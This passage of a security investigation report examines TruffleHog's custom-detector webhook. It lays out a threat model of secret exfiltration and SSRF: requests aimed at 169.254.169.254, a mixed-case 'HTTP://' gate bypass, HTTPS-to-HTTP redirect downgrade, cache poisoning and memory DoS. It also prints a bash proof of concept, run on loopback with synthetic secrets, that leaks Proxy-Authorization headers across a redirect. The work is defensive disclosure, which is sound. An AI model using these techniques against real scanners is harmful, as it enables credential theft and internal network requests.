- **Isolated Go RE2 microbenchmark [OBSERVED, non-CLI]:** compiling the identical `(a+)+$` and timing only `FindStringSubmatch` shows pure-engine linearity: ≈0.98 ms at 10 000 → ≈243 ms at 5 000 000 characters, with `match=false` throughout. Roughly 500× the input yields roughly 250× the time — linear, not exponential. (This runs Go's `regexp` directly, outside the scanner, and is labeled accordingly.)
- **NON-CANONICAL COMPARISON — Python `re` (backtracking) [NON-CANONICAL]:** the *same* pattern and input shape on Python's backtracking engine explodes: ≈0.38 s at n=22 → ≈86.9 s at n=30 — catastrophic backtracking. This is **not** TruffleHog and uses a different engine; it is included only to make concrete the exponential blow-up that RE2 structurally avoids. It must not be read as TruffleHog behavior.

Together these show TruffleHog's custom-detector regex path is linear-time (RE2) and immune to classic backtracking ReDoS.

---

## 9. Threat model synthesis

**Direct answer:** The trust boundary is **whoever supplies the `--config` file**. A custom-detector config is executable trust: its author chooses the verification endpoint, the headers, and the regex, and TruffleHog will place **matched secrets from the scanned data** into an HTTP `POST` to that endpoint. If untrusted parties can contribute detector configs, they gain a credential-exfiltration and internal-request primitive. This is a configuration-authoring threat, distinct from (and more severe than) the blind-SSRF-from-scanned-data class.

### 9.1 What a config author can do (grounded in the evidence above)

- **Exfiltrate every matched secret to an endpoint they choose.** The body is the matched secret material in cleartext (§6.1–§6.4); the destination is unrestricted at the config layer (§3). This is the core capability.
- **Direct requests at internal / link-local / metadata addresses.** No allowlist/denylist exists (§3.1); the metadata address `169.254.169.254` is accepted and a secret-bearing `POST` is aimed at it (§3.3). **Precisely:** this is **request reachability plus secret-bearing `POST` egress**, *not* cloud-credential retrieval — the verifier only ever issues a `POST` with a JSON body, whereas IMDS credential retrieval is a `GET` (IMDSv2 additionally requires a `PUT` token) (§3.6, §10). Whether a given network actually routes to such a host is environment-dependent; TruffleHog itself imposes no destination restriction.
- **Receive data back (bidirectional channel).** On a 200, up to 200 bytes of the endpoint's response are read into `ExtraData["response"]` and shown to the operator (§6.4). The endpoint author therefore controls a small return channel, not just a sink.
- **Fan out and amplify.** Verification is dispatched per match permutation, capped at 100 **per keyword-match region** (per `FromData` invocation) — not per chunk and not scan-wide — and multiplied by the number of configured verifiers and by followed redirects (§5). A single chunk with multiple non-merging regions can already exceed 100 (observed: **120** verifications in one chunk); the total grows further across chunks, verifiers, and each redirect hop, which replays the secret-bearing body (and leaks a `Referer`) to a new destination (§6.5).
- **Choose cleartext.** Setting `unsafe: true` with an `http://` endpoint sends the identical secret body with **no** TLS protection (§3.4, §4.5).
- **Defeat the plaintext safeguard silently.** The `unsafe`-required gate is the only barrier to unacknowledged cleartext egress, and it is **case-sensitive** [validation.go:40]: a mixed-case scheme (`HTTP://`, `Http://`, `hTtP://`) bypasses it, so the config loads and sends the secret in cleartext with **no** `unsafe: true` opt-in at all (observed: each variant → one verified cleartext `POST`) (§3.5). The author does not even have to declare the cleartext intent.
- **Downgrade an HTTPS webhook to cleartext through a redirect.** A verifier pointed at an `https://` endpoint still follows redirects under `net/http`'s default policy (there is no custom `CheckRedirect`), so a first-hop `307`/`308` whose `Location` is an `http://` URL replays the identical secret-bearing body over **cleartext** — the secret starts TLS-protected and ends in plaintext on the wire, with **no** `unsafe: true` and **no** re-validation of the downgraded scheme (observed hop-2 cleartext capture, §6.5). The redirect target is chosen by whoever controls the first-hop endpoint.
- **Inflate scanner memory via the response read.** On a 200 the **entire** response body is read with `io.ReadAll` [custom_detectors.go:253] *before* truncation to 200 bytes, so an endpoint the author controls can return an arbitrarily large body to inflate the scanner's peak resident memory (observed: a 128 MiB response → ~599 MiB peak RSS) — a memory-amplification / denial-of-service surface against the **scanning host**, independent of the secret-exfiltration channel (§6.8).
- **Poison another tenant's verification result through the shared cache.** The verification-cache key is `hash(Raw + RawV2 + DetectorType)` with `DetectorType` fixed at `904` for **every** `CustomRegex` detector, and the detector *name* is **not** part of the key (§7.6). A config author who crafts a detector matching the **same `Raw` bytes** as another team's detector causes the single shared in-process cache to serve **their** verifier's outcome for the other detector — flipping a genuinely-unverified finding to **Verified**, or suppressing a real one — directionally by scan order (observed: A-wins → 36 of B's results falsely Verified; B-wins → 36 of A's suppressed) (§7.6).
- **Leak proxy credentials across a cross-origin redirect (toolchain-specific).** On the pinned `go1.24.2`, `net/http` strips `Authorization`/`Cookie` on a cross-origin redirect but **retains `Proxy-Authorization`** (advisory `GO-2025-3751` / `CVE-2025-4673`, fixed in `go1.24.4`); a config author who sets that header on the verifier gains an extra credential-leak channel to the redirect target until the toolchain is advanced — a control outside this read-only document's scope (§11.5, §11.8).

### 9.2 What the system does constrain (qualified, not overstated)

- **HTTPS certificate validation is real, in the observed contrast.** With an HTTPS endpoint, Go's default strict verification applies; an untrusted certificate blocks the handshake so the secret is **not** transmitted and the result is **unverified** (§4.2–§4.3). This makes a passive network MITM against an HTTPS webhook ineffective **in the environment tested**; it is not a claim that certificate trust is the only factor in every deployment, nor does it protect the opt-in `http://` path.
- **The secret is not always transmitted on failure — it depends on the stage.** A pre-write failure (untrusted-TLS handshake) withholds the secret (0 server requests); a failure at/after the request write (e.g. a 403, or a post-send read error) does not (§6.4). Statements that "any connection error means the secret was not sent" are incorrect.
- **RE2 bounds regex cost.** Patterns run on a linear-time, backtracking-free engine, so a hostile regex cannot mount a classic catastrophic-backtracking DoS (§8).
- **De-duplication is a performance optimization, not a dependable amplification control.** With the cache on (default), *identical* secrets are de-duplicated, but the reduction is **concurrency-dependent**: at higher worker concurrency, cold concurrent chunks all miss the cache before any result is written, so the outbound `POST` count is **not** reduced (observed: `--concurrency=1` → 8 POSTs / 68 attempts saved, but `--concurrency=128` → 40 POSTs / 0 saved, matching cache-off) (§7.5). It must **not** be relied on to bound outbound verification volume, and — per the poisoning capability above — it is also a cross-detector correctness hazard, not a safety boundary.

### 9.3 Bottom line

An actor who controls a detector configuration **can** abuse the verification system: they can harvest secrets found in the scanned data and send them, in cleartext if they choose, to arbitrary internal or external destinations, with a return channel and amplification. Deploying TruffleHog with **untrusted, multi-tenant detector configs is unsafe** unless the config source is trusted or the endpoints are constrained out-of-band (e.g. egress firewalling, an allowlist enforced by the network, or review of every `--config`). The engine-level protections (strict HTTPS verification, RE2) are genuine but narrow; they do not address the central risk, which is that the config author is inside the trust boundary.

---

## 10. External corroboration

The following authoritative sources corroborate — but do not substitute for — the runtime observations above. Each is marked **[CORROBORATED]** and quoted minimally.

- **[CORROBORATED] Go `regexp` is RE2 / linear-time (supports §8).** Official package documentation, *"regexp package - regexp - Go Packages"* (https://pkg.go.dev/regexp), states matching is `"guaranteed to run in time linear in the size of the input"`. The syntax reference is *"Syntax - regexp/syntax"* (https://pkg.go.dev/regexp/syntax) and the RE2 design is described in Russ Cox's *"Regular Expression Matching Can Be Simple And Fast"* (https://swtch.com/~rsc/regexp/regexp1.html). This confirms the observed linear scaling and the absence of catastrophic backtracking.

- **[CORROBORATED] `net/http` default redirect replays method and body via `GetBody` (supports §6.5).** Official documentation, *"http package - net/http - Go Packages"* (https://pkg.go.dev/net/http), states a 307/308 redirect `"preserves the original HTTP method and body, provided that the Request.GetBody function is defined."` Because the verifier builds the request from a `bytes.Reader`, `GetBody` is populated, so the secret body is replayed on redirect — matching the hop-2 capture in §6.5.

- **[CORROBORATED] `crypto/tls` verifies by default when `TLSClientConfig` is unset (supports §4).** Official documentation, *"tls package - crypto/tls - Go Packages"* (https://pkg.go.dev/crypto/tls), states that for `RootCAs`, `"If RootCAs is nil, TLS uses the host's root CA set"`, and that `InsecureSkipVerify` defaults to `false` (full certificate and hostname verification). This confirms that `SaneHttpClient`, which sets no `TLSClientConfig`, gets strict verification — matching the untrusted-cert failure in §4.2.

- **[CORROBORATED] `169.254.169.254` is the cloud instance-metadata endpoint (supports §3).** AWS documentation, *"Use the Instance Metadata Service to access instance metadata - Amazon EC2"* (https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), documents the link-local `169.254.169.254` address and that IMDSv2 requires a `PUT` to `/latest/api/token` to obtain a token that must accompany subsequent `GET` requests (IMDSv1 uses a plain `GET`). This confirms the significance of the address in §3 and the method/shape mismatch (verifier `POST` vs metadata `GET`/`PUT`) noted in §3.6 and §9.1.

- **[CORROBORATED] TruffleHog's own security policy places the config-webhook vector in the CVE-worthy class, not the "hardening-only" blind-SSRF class (supports §9).** The project `SECURITY.md` (*"trufflehog/SECURITY.md at main"*, https://github.com/trufflesecurity/trufflehog/blob/main/SECURITY.md) treats blind SSRF — inducing outbound requests without data retrieval — `"as a hardening opportunity rather than a vulnerability"`, and states a CVE **is** issued for a demonstrated exploit chain such as *credential exfiltration*: forcing TruffleHog to send third-party secrets found during a scan, or the host's own IAM-metadata credentials, to an attacker-controlled endpoint. Its triage questions explicitly ask whether a legitimate secret (not the attacker's own payload) is attached to the outbound request, and whether the request can reach restricted internal IPs such as `127.0.0.1` or `169.254.169.254`. The configuration-controlled webhook studied here satisfies exactly those criteria: the `--config` author both chooses the endpoint (§3) and causes the matched secret to populate the `POST` body (§6.4), and can direct it at loopback or the metadata address (§3.4–§3.6). This corroborates the §9 conclusion that the config author sits *inside* the trust boundary — and distinguishes this vector from the *reflected/blind* interactions the policy declines to treat as vulnerabilities.

- **[CORROBORATED] The published TruffleHog SSRF advisory (GHSA-3r74-v83p-f4f4 / CVE-2024-43379) is a *distinct*, built-in-detector, scanned-data vector — not the config-webhook path (context for §3, §9).** The GitHub Security Advisory *"Blind SSRF in some Detectors"* (https://github.com/trufflesecurity/trufflehog/security/advisories/GHSA-3r74-v83p-f4f4; NVD https://nvd.nist.gov/vuln/detail/CVE-2024-43379) describes crafted *scanned data* triggering a built-in detector to request an attacker-chosen `"unauthenticated GET endpoint that produces side effects"`. It is rated **Low** (NVD CVSS 3.1 base score **3.4**; **CWE-918**, Server-Side Request Forgery) and was **fixed in v3.81.9**. It differs from this investigation's vector on two axes: (a) the attacker controls the *scanned content*, not the detector configuration; and (b) it is *blind* — no secret is knowingly attached and no response is returned to the attacker — whereas the config-webhook path knowingly places the matched secret in the body (§6.4) and exposes a status/body channel to the configured endpoint (§6.1). **[OBSERVED]** The distinction is verifiable in the checked-out tree: the v3.81.9 fix introduced a local-address-blocking client, `DetectorHttpClientWithNoLocalAddresses` [pkg/detectors/http.go:33-38], whose `isLocalIP` guard rejects loopback, link-local, and private ranges [pkg/detectors/http.go:96-97], and wired it into the built-in detectors (38 files, e.g. [pkg/detectors/thinkific/thinkific.go:24]); the custom-detector webhook path exercised throughout §3 still uses the *un-restricted* `common.SaneHttpClient()` [pkg/custom_detectors/custom_detectors.go:62] (zero usages of the restricted client anywhere under `pkg/custom_detectors/`). External analysis corroborates that root cause — the advisory's fix replaced `common.SaneHttpClient()` with `detectors.DetectorHttpClientWithNoLocalAddresses` in the affected detectors (Miggo, https://www.miggo.io/vulnerability-database/cve/CVE-2024-43379). The built-in-detector hardening therefore does **not** cover the SSRF surface observed in §3, which is why that surface remains open at this commit.

---

## 11. Baseline toolchain and dependency posture (govulncheck)

> **Scope note (read-only / baseline).** This section documents a **pre-existing** property of the repository as checked out — it is **not** a change introduced by this investigation, and no remediation is applied. The module graph is exactly what `go.sum` pins: `go.mod`/`go.sum` are left **byte-for-byte unchanged** (verified below and in §13.1, `go.sum` SHA-256 `4645b984cd422fe71afd1d8498b92bec59ef1487d5bd6d2362679d7b6a92e77a`). The suggested remediation (advancing the pinned Go toolchain to ≥ `go1.24.4`) is **not** applied, because (a) the task is read-only and (b) `go.mod` pins `toolchain go1.24.2` [go.mod:5]; building an alternate toolchain would be non-canonical. The purpose here is disclosure of the posture that the runtime evidence in §3–§8 was produced on, and its bearing on the threat model (§9).

### 11.1 Why this matters to the webhook path

The custom-detector verification flow makes its outbound request at exactly one call site — `httpClient.Do(req)` inside `createResults` [pkg/custom_detectors/custom_detectors.go:240] — using the standard-library `net/http` client returned by `SaneHttpClient` [pkg/common/http.go:223-229]. That call site is the ground truth for §3–§6. It is therefore directly relevant that the pinned standard library carries **reported, called** vulnerabilities in precisely the packages this path exercises (`net/http`, `crypto/x509`). The redirect-downgrade behavior already observed in §6.5 and the cross-origin header handling below are governed by this same `net/http` version.

### 11.2 Tool provenance (OBSERVED)

The scanner used is `golang.org/x/vuln/cmd/govulncheck`, built offline from the warm module cache into `/tmp/gvbin/govulncheck` (never added to the repo). Its self-reported provenance — note the vulnerability database is **live** this session (last updated `2026-07-08`), so these are current advisories, not a stale snapshot:

```text
$ /tmp/gvbin/govulncheck -version
Go: go1.24.2
Scanner: govulncheck@v0.0.0
DB: https://vuln.go.dev
DB updated: 2026-07-08 17:05:00 +0000 UTC
```

### 11.3 Binary-mode scan of the canonical build (OBSERVED)

Scanning the exact binary the rest of this document runs (`/tmp/trufflehog`, built `CGO_ENABLED=0 go build`, version `dev`) reports **58** called vulnerabilities across 10 modules plus the standard library. The two standard-library advisories that govern the webhook path — `GO-2025-3751` (`net/http`) and `GO-2025-3749` (`crypto/x509`) — are shown verbatim; both are **Fixed in go1.24.4**, one minor patch ahead of the pinned `go1.24.2`. (The full 58-entry enumeration is long; the exact summary line and the two cited advisory blocks are reproduced unedited — this is the complete output for the specific claims made here.)

```text
$ /tmp/gvbin/govulncheck -mode=binary /tmp/trufflehog
... (57 preceding vulnerability entries) ...
Vulnerability #57: GO-2025-3751
    Sensitive headers not cleared on cross-origin redirect in net/http
  More info: https://pkg.go.dev/vuln/GO-2025-3751
  Standard library
    Found in: net/http@go1.24.2
    Fixed in: net/http@go1.24.4
    Vulnerable symbols found:
      #1: http.Client.Do
      #2: http.Client.Get
      #3: http.Client.Head
      #4: http.Client.Post
      #5: http.Client.PostForm
      Use '-show traces' to see the other 1 found symbols

Vulnerability #58: GO-2025-3749
    Usage of ExtKeyUsageAny disables policy validation in crypto/x509
  More info: https://pkg.go.dev/vuln/GO-2025-3749
  Standard library
    Found in: crypto/x509@go1.24.2
    Fixed in: crypto/x509@go1.24.4
    Vulnerable symbols found:
      #1: x509.Certificate.Verify

Your code is affected by 58 vulnerabilities from 10 modules and the Go standard library.
This scan also found 22 vulnerabilities in packages you import and 7
vulnerabilities in modules you require, but your code doesn't appear to call
these vulnerabilities.
Use '-show verbose' for more details.
```

`http.Client.Do` — the reported symbol #1 of `GO-2025-3751` — is exactly the function `createResults` invokes at [custom_detectors.go:240], and `x509.Certificate.Verify` — the reported symbol of `GO-2025-3749` — is the routine that backs the TLS verification observed in §4. The pinned toolchain's affected symbols are on the live webhook path.

### 11.4 Source-mode call-graph scan scoped to the in-scope packages (OBSERVED)

A source-mode scan restricted to the packages this investigation exercises (`./pkg/custom_detectors/...`, `./pkg/common/...`) reports **27** called standard-library vulnerabilities, and its call-graph output names the webhook `POST` as an example trace for `GO-2025-3751` — the decisive link between the advisory and the feature under study. (As with §11.3, the enumeration is long; the block below is trimmed to the cited `GO-2025-3751` advisory and the summary line — the shown lines are reproduced unedited, and `...` marks elided entries. The complete tool output is preserved on disk at `/tmp/th_harness/gv_source_scoped.txt`.)

```text
$ GOFLAGS=-mod=readonly /tmp/gvbin/govulncheck ./pkg/custom_detectors/... ./pkg/common/...
... (24 preceding vulnerability entries) ...
Vulnerability #25: GO-2025-3751
    Sensitive headers not cleared on cross-origin redirect in net/http
  More info: https://pkg.go.dev/vuln/GO-2025-3751
  Standard library
    Found in: net/http@go1.24.2
    Fixed in: net/http@go1.24.4
    Example traces found:
      #1: pkg/custom_detectors/custom_detectors.go:240:29: custom_detectors.CustomRegexWebhook.createResults calls http.Client.Do
      #2: pkg/common/secrets.go:53:40: common.GetSecret calls apiv1.NewClient, which eventually calls http.Client.PostForm
... (GO-2025-3749 reported as Vulnerability #27, trace: pkg/common/utils.go:48:25 -> x509.Certificate.Verify) ...

Your code is affected by 27 vulnerabilities from the Go standard library.
This scan also found 15 vulnerabilities in packages you import and 29
vulnerabilities in modules you require, but your code doesn't appear to call
these vulnerabilities.
Use '-show verbose' for more details.
```

Trace `#1` — `pkg/custom_detectors/custom_detectors.go:240:29: ... createResults calls http.Client.Do` — is the verification webhook `POST` itself. The advisory is not merely present in the module graph; govulncheck's own call graph proves it is **reachable from the custom-detector verification code**.

### 11.5 Runtime reproduction of GO-2025-3751 through the canonical `--config` path (OBSERVED)

Rather than rely on the scanner's static call graph, the cross-origin-redirect header-leak was reproduced **at runtime** through the real entry point. A config author sets four sensitive webhook headers; a trusted first hop (`localhost`) returns a `307` to a **cross-origin** second hop (`127.0.0.1` — Go treats a different host as a different origin). We observe which headers Go 1.24.2's `net/http` replays to the cross-origin target. The scenario `source`s `lib.sh` from §2.3 (`pick_ports`, `start_server`, `make_canon_data`, `stop_all`):

```bash
#!/usr/bin/env bash
# ---- scripts/17_redirect_headerleak.sh ----
# Reproduces GO-2025-3751 (net/http, go1.24.2): sensitive headers not cleared on
# a CROSS-ORIGIN redirect. hop1 host = "localhost", hop2 host = "127.0.0.1" (Go
# treats these as different origins). The configured webhook headers are attached
# by createResults [custom_detectors.go:232-240] and replayed by http.Client.Do
# across the 307. We observe WHICH sensitive headers reach the cross-origin hop2.
source /tmp/th_harness/scripts/lib.sh
read P1 P2 < <(pick_ports 2)
H1="$EV/rl_hop1.log"; H2="$EV/rl_hop2.log"
# hop2: plain 200 collector (host 127.0.0.1)
start_server "$P2" 200 "$H2" >/dev/null
# hop1: 307 -> cross-origin hop2 (host 127.0.0.1); reached via host "localhost"
start_server "$P1" 307 "$H1" "" "http://127.0.0.1:$P2/" >/dev/null

make_canon_data "$TH/data_rl"
CFG="$TH/redirect_leak.yaml"
cat > "$CFG" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: http://localhost:$P1/
        unsafe: true
        headers:
          - "Authorization: Bearer SECRET-AUTH-VALUE"
          - "Proxy-Authorization: Basic SECRET-PROXY-VALUE"
          - "Cookie: session=SECRET-COOKIE-VALUE"
          - "X-Custom-Secret: SECRET-CUSTOM-VALUE"
CFG

echo "### cross-origin redirect: localhost:$P1 (307) -> 127.0.0.1:$P2 ; canonical go1.24.2 binary"
env NO_PROXY=localhost,127.0.0.1 no_proxy=localhost,127.0.0.1 \
  "$BIN" filesystem "$TH/data_rl" --config="$CFG" --no-update >/dev/null 2>&1

echo ""; echo "===== HOP1 (localhost:$P1) received these sensitive headers ====="
grep -iE 'HEADER: (Authorization|Proxy-Authorization|Cookie|X-Custom-Secret):' "$H1" | sort -u
echo ""; echo "===== HOP2 (127.0.0.1:$P2, CROSS-ORIGIN target) received these sensitive headers ====="
grep -iE 'HEADER: (Authorization|Proxy-Authorization|Cookie|X-Custom-Secret):' "$H2" | sort -u
echo ""; echo "===== verdict per header at cross-origin hop2 ====="
for h in Authorization Proxy-Authorization Cookie X-Custom-Secret; do
  if grep -qiE "HEADER: $h:" "$H2"; then echo "  $h: LEAKED to cross-origin target"; else echo "  $h: stripped"; fi
done
stop_all
```

Complete, unedited output:

```text
### cross-origin redirect: localhost:47177 (307) -> 127.0.0.1:36393 ; canonical go1.24.2 binary

===== HOP1 (localhost:47177) received these sensitive headers =====
HEADER: Authorization: Bearer SECRET-AUTH-VALUE
HEADER: Cookie: session=SECRET-COOKIE-VALUE
HEADER: Proxy-Authorization: Basic SECRET-PROXY-VALUE
HEADER: X-Custom-Secret: SECRET-CUSTOM-VALUE

===== HOP2 (127.0.0.1:36393, CROSS-ORIGIN target) received these sensitive headers =====
HEADER: Proxy-Authorization: Basic SECRET-PROXY-VALUE
HEADER: X-Custom-Secret: SECRET-CUSTOM-VALUE

===== verdict per header at cross-origin hop2 =====
  Authorization: stripped
  Proxy-Authorization: LEAKED to cross-origin target
  Cookie: stripped
  X-Custom-Secret: LEAKED to cross-origin target
```

**Reading (OBSERVED).** On the cross-origin `307`, Go 1.24.2 correctly strips `Authorization` and `Cookie` (the general cross-domain protection of CVE-2024-45336 works), **but leaks `Proxy-Authorization`** to the cross-origin target — this is exactly `GO-2025-3751` / `CVE-2025-4673`, reproduced live on the webhook path. The non-standard `X-Custom-Secret` is also replayed cross-origin, because the sensitive-header list Go strips is fixed (`Authorization`, `WWW-Authenticate`, `Cookie`, `Cookie2`) and never includes an author's arbitrary header. A config author who sets a `Proxy-Authorization` (or any custom) header on the webhook can therefore have it delivered to a redirect-chosen third origin.

### 11.6 External corroboration of the observed advisories (CORROBORATED)

- **[CORROBORATED] `GO-2025-3751` = `CVE-2025-4673`.** The Go vulnerability report *"Vulnerability Report: GO-2025-3751"* (https://pkg.go.dev/vuln/GO-2025-3751) states `"Proxy-Authorization and Proxy-Authenticate headers persisted on cross-origin redirects potentially leaking sensitive information"`, lists the affected range as `net/http` before `go1.23.10` and from `go1.24.0-0` before `go1.24.4`, and enumerates the affected symbols `Client.Do`, `Client.Get`, `Client.Head`, `Client.Post`, `Client.PostForm` (among others). This matches the binary-scan symbols (§11.3) and the runtime leak of `Proxy-Authorization` (§11.5) precisely.
- **[CORROBORATED] Fixed in `go1.24.4` / `go1.23.10`.** The release announcement *"[security] Go 1.24.4 and Go 1.23.10 are released"* (https://groups.google.com/g/golang-announce/c/ufZ8WpEsA3A) lists both `CVE-2025-4673` (the `net/http` header issue) and the `crypto/x509` item `"usage of ExtKeyUsageAny disables policy validation"` (which is `GO-2025-3749`), confirming the exact fix release reported by the scan's `Fixed in: …@go1.24.4` fields.

### 11.7 What was NOT run, and what is inferred

- **[NON-CANONICAL — NOT RUN]** A comparison build on `go1.25.12` (suggested by the QA finding) was **not** performed. `go.mod` pins `toolchain go1.24.2` and the environment is offline for alternate toolchains; building a different toolchain would be a non-canonical substitute for the pinned build and would risk touching `go.sum`. No `go1.25.x` numbers are claimed here.
- **[INFERRED — from the advisory, not observed]** Because the scan's own `Fixed in: net/http@go1.24.4` field (OBSERVED in §11.3) and the release announcement (CORROBORATED in §11.6) both state the fix landed in `go1.24.4`, a toolchain at ≥ `go1.24.4` would clear `Proxy-Authorization`/`Proxy-Authenticate` on the cross-origin redirect. This is inferred from the fix metadata; it was not reproduced on a patched toolchain in this investigation.

### 11.8 Bearing on the threat model

This posture **sharpens** the redirect finding of §6.5 and §9.1: not only does a redirect replay the secret-bearing JSON body to a new destination, but under the pinned `go1.24.2` an endpoint-controlled cross-origin redirect additionally leaks a configured `Proxy-Authorization` header (and any custom header) to that destination — an extra, toolchain-specific channel available to a config author. It does **not** widen the certificate-verification story of §4: `crypto/x509` strict verification still applies (the `GO-2025-3749` `ExtKeyUsageAny` issue concerns policy validation when `ExtKeyUsageAny` is requested, which this path does not do). The engine-level protections remain as characterized in §9; this section adds that the **pinned standard library itself** contributes a known, called, header-leak primitive to the webhook path until the toolchain is advanced — a control that lives outside this read-only document's scope.

---

## 12. Coverage pass

Every named sub-question and mechanism from the prompt is addressed, with observed evidence and `file:line` citations:

| Question / named item | Where answered | Verdict (observed) |
|---|---|---|
| SSRF: what happens with an internal / `169.254.169.254` endpoint? | §3.3 | No filtering; secret-bearing `POST` aimed at the metadata address |
| Any validation / allowlist / denylist? (`ValidateVerifyEndpoint`) | §3.1 [validation.go:35-44] | Only an `http`+`unsafe` check; no address filtering |
| `http://` without `unsafe`? / `https://` without `unsafe`? / mixed-case scheme? | §3.4–§3.5 | lowercase `http` rejected at load; `https` accepted; **mixed-case `HTTP://`/`Http://`/`hTtP://` bypasses the gate** [validation.go:40] and sends the secret in cleartext with **no** `unsafe: true` (§3.5) |
| TLS/cert validation on HTTPS webhooks? MITM? | §4.1–§4.3 | Go default strict verification; untrusted cert ⇒ 0 requests, unverified; a **trusted-CA cert bearing the wrong SAN** is also blocked by the hostname check (§4.3). **Caveat:** the protection is defeated by an HTTPS→HTTP redirect that downgrades the identical secret-bearing body to cleartext (§6.5) |
| Which client? (`SaneHttpClient`, no `TLSClientConfig`) | §4.1 [http.go:211-221, custom_detectors.go:62] | No `InsecureSkipVerify`, no pinning on this path |
| Amplification: once or many times? any cap? | §5.3–§5.4 | Per-permutation; cap 100 **per keyword-match region** (per `FromData`), not per chunk / scan-wide |
| `permutateMatches` / `maxTotalMatches = 100` | §5.1 [custom_detectors.go:23,110,295-296; engine.go:1061-1070] | Confirmed per-region; one chunk ⇒ 120 POSTs; multi-file 2×150 ⇒ 200 |
| Multiple verifiers / redirects amplify? | §5.4, §6.5 | Fan-out to every verifier; each redirect hop replays body |
| HTTPS→HTTP redirect downgrade (MITM caveat)? | §6.5 | No custom `CheckRedirect`; a first-hop `307`/`308` to an `http://` `Location` replays the **identical secret body in cleartext**, no `unsafe` and no scheme re-validation (observed hop-2 cleartext capture) |
| Data surface: headers, body, secret material | §6.1–§6.4, §6.6, §6.8 [custom_detectors.go:214-238, :253] | Exact JSON secret body; headers key-canonicalized + value-left-trimmed (not verbatim); default `User-Agent: TruffleHog` is config-overridable; `Host`/`Content-Length` regenerated; full 200 body read into memory (unbounded) then truncated to 200 bytes |
| Secret sent on non-200? | §6.3–§6.4 | Yes (403 case still receives the full request) |
| Response readback (bidirectional)? | §6.4 [custom_detectors.go:253-266] | Up to 200 **bytes** into `ExtraData["response"]` |
| Response-body memory / DoS against the scanning host? | §6.8 [custom_detectors.go:253] | Entire 200 body read with `io.ReadAll` **before** truncation; no size cap ⇒ a controlled endpoint returning 128 MiB drove ~599 MiB peak RSS (memory amplification) |
| Header handling (`strings.Cut`, `TrimLeft`, canonicalization) | §6.6 [custom_detectors.go:233,238] | First-colon split, left-trim, canonicalized, dups kept, malformed rejected |
| `successRanges` behavior at this commit | §6.7 [custom_detectors.go:249; validation.go:55-97] | No-op: only `== 200` is checked |
| Verification caching / dedup | §7.1–§7.4 [verification_cache.go:58-147] | All-hit short-circuit; key = `hash(Raw+RawV2+DetectorType)` |
| Does the cache dependably bound outbound POSTs? (concurrency) | §7.5 [engine.go:343-345,676] | **No** — concurrency-dependent: `--concurrency=1` ⇒ 8 POSTs / 68 saved, but `--concurrency=128` ⇒ 40 POSTs / 0 saved (= cache-off); not a dependable amplification control |
| Cross-detector cache isolation? (poisoning) | §7.6 [verification_cache.go:136-147; detectors.go:117-123] | **None** — `DetectorType` fixed at `904` for every `CustomRegex` and the detector *name* is not in the key, so a detector matching the same `Raw` serves its verifier's status to another (observed directional poisoning: A-wins 76/4, B-wins 4/76) |
| ReDoS: complex/malicious regex handling; safeguards? | §8 [validation.go:23-33] | RE2 (linear, no backtracking); `(a+)+$` does not blow up |
| Overall threat model / trust boundary | §9 | Config author is inside the trust boundary; unsafe for untrusted configs |
| External corroboration (RE2, net/http, crypto/tls, IMDS; TruffleHog `SECURITY.md` policy; GHSA-3r74-v83p-f4f4 / CVE-2024-43379) | §10 | Six authoritative sources; project policy places the config-webhook in the credential-exfiltration (CVE-worthy) class, and the built-in-detector advisory is distinguished from this vector |
| Baseline toolchain / dependency posture (govulncheck) | §11 [go.mod:5] | **[BASELINE, not a change]** `go.mod`/`go.sum` untouched; binary scan = 58 vulns / 10 modules+stdlib (incl. `GO-2025-3751`/`CVE-2025-4673`, `GO-2025-3749`); a cross-origin redirect retains `Proxy-Authorization` on the pinned `go1.24.2` (§11.5, §11.8) |

**Detector attribution (correction).** All primary probes — SSRF (§3), TLS (§4), amplification (§5), data surface and headers (§6), caching (§7) — use TruffleHog's own **`HogTokenDetector`** definition (from `pkg/custom_detectors/CUSTOM_DETECTORS.md`) through the canonical `--config` path. The **only** exception is the ReDoS experiment (§8), which necessarily uses a distinct **`ReDoSProbe`** detector whose regex is the catastrophic `(a+)+$`; this is stated explicitly in §8.2 and is not claimed to be `HogTokenDetector`. The non-canonical Python contrast in §8.3 is not TruffleHog at all and is labeled `[NON-CANONICAL COMPARISON]`.

Every named sub-question in the prompt is addressed above — each with its section, its supporting evidence, and an explicit provenance label; where a specific runtime signal could not be produced through the canonical `--config` path it is labeled **[INFERRED]** or **[NON-CANONICAL]** rather than asserted as observed.

---

## 13. Integrity and cleanup

### 13.1 Repository integrity

This investigation is read-only with respect to the repository. The **only** committed change is this document. Concretely:
- `git status --porcelain` reports exactly one changed path, `blitzy/documentation/trufflehog_e42153d44a5e.md`; no source, test, proto, or example file is modified.
- `go.mod` and `go.sum` are untouched (the scanner is built from the existing, pinned module graph; `go mod download all` was deliberately avoided because it would append transitive checksums to `go.sum`).
- All observation artifacts — the built binary, the capture servers, probe configs, scan data, and logs — live under `/tmp` (outside the repository) and bind loopback (`127.0.0.1`) only. Nothing global on the host is mutated (no `iptables`, no host networking).
- Every secret used is **synthetic** (a randomly-shaped 40-character token), never a real credential.

### 13.2 A note on output fidelity

Embedded command output is reproduced faithfully, with two deliberate and disclosed exceptions. **First**, a single normalization: trailing end-of-line whitespace — invisible when rendered and carrying no semantic content — was stripped so the deliverable passes `git diff --check`. For instance, `openssl`'s `X509v3 Subject Alternative Name:` header (its value is on the following line) and TruffleHog's `Response:` label for an empty body each end with such whitespace in the raw terminal capture. **Second**, a small number of intrinsically long enumerations — notably the 58-entry `govulncheck` listing in §11.3, the 154-line `--log-level=5` trace in §4.4, and dense per-worker scan logs — are shown **filtered to their security-relevant lines**, with the filtering command (`grep`/`head`/`sed`/`wc`) visible inline so the reduction is explicit; the **complete** raw captures are preserved on disk under `/tmp/th_harness/ev2/` (and `gv_binary.txt` / `gv_source_scoped.txt`) and indexed in the command-indexed evidence appendix (§14). No values, counters, lines, or other content were added, removed, or altered within any shown block; the emptiness of the empty `Response:` is independently shown by the server-side capture and the `finished scanning` summary.

### 13.3 Teardown procedure

